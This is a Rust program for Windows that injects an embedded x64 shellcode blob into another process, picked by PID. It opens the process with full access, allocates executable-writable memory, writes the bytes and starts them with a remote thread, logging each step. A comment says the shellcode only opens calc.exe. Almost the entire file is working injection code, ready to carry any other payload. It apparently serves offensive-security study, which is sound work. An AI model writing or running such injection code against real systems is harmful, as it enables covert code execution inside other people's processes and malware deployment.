use std::env;
use std::ptr::{null, null_mut};
use user32::CloseTouchInputHandle;
use winapi::shared::minwindef::{BOOL, FALSE, LPVOID};
use winapi::shared::ntdef::NULL;
use winapi::um::processthreadsapi::{CreateProcessA, CreateRemoteThreadEx, OpenProcess};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
use winapi::um::errhandlingapi::{GetLastError };
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::minwinbase::{LPTHREAD_START_ROUTINE};
use winapi::um::handleapi::{CloseHandle };

fn main() -> Result<(), Box<dyn std::error::Error>>{


       /* ------------ [Shellcode (in this example pop a calc.exe)] ---------------------- */
       let shellcode: Vec<u8> = vec![
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
        0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
        0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
        0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41,
        0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
        0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40,
        0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
        0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
        0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
        0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a,
        0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b,
        0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
        0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd,
        0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff,
        0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
    ];


    /* ----------- [GET PID] -------------- */
    let args: Vec<String> = env::args().collect();
    let argc = args.len();
    let mut pid : winapi::shared::minwindef::DWORD = 0;
    let mut tid : winapi::shared::minwindef::DWORD = 0;

    let mut h_process: winapi::shared::ntdef::HANDLE = null_mut();
    let mut h_thread: winapi::shared::ntdef::HANDLE = null_mut();
    let mut r_buffer : LPVOID = std::ptr::null_mut();

 
    if argc < 2 {
        return Err(format!("[!] Usage: {:?} <PID>", args[0]).to_string().into());
    }
    pid = args[1].parse::<u32>().map_err(|err| format!("[!] Failed to parse PID: {}", err))?;

    /* ------------ [OPEN Handle to Process ] ---------------- */

    unsafe {
        h_process = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            pid
        );

        if h_process == null_mut() {
            return Err(format!("[!] couldn't get a handle to the process {}, error: {}", pid, GetLastError()).into());
        }

        println!("[+] Got a handle to the process! -- 0x{:?}", h_process);

        /* ------------ [Allocate Bytes to process memory] ---------------*/

        r_buffer =  VirtualAllocEx(h_process, null_mut(), shellcode.len(), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
        println!("[+] Allocated {:?} bytes with PAGE_EXECUTION_READWRITE permissions", shellcode.len());


        /* ------------ [write the allocated memory to the process memory] --------------- */
        WriteProcessMemory(h_process, r_buffer, shellcode.as_ptr() as LPVOID, shellcode.len(), null_mut() as *mut usize);
        println!("[+] Wrote {:?} bytes to the memory", shellcode.len());

        /* ------------ [Create thread to run the payload] --------------- */
        let thread_start_routine = std::mem::transmute::<LPVOID, LPTHREAD_START_ROUTINE>(r_buffer);
        h_thread = CreateRemoteThreadEx(
            h_process,
            null_mut(),
            0,
            thread_start_routine,
            null_mut(),
            0,
            null_mut(),
            &mut tid
        );

        if h_thread == null_mut() {
            CloseHandle(h_process);
            return Err(format!("[!] couldn't get a handle to the thread  error: {}", GetLastError()).into());
        }

        println!("[+] Got a handle to the thread {:?}! -- 0x{:?}", tid ,h_thread);

        println!("[*] Cleaning Up");
        CloseHandle(h_thread);
        CloseHandle(h_process);
        println!("[*] Done!");
    }

    Ok(())
}
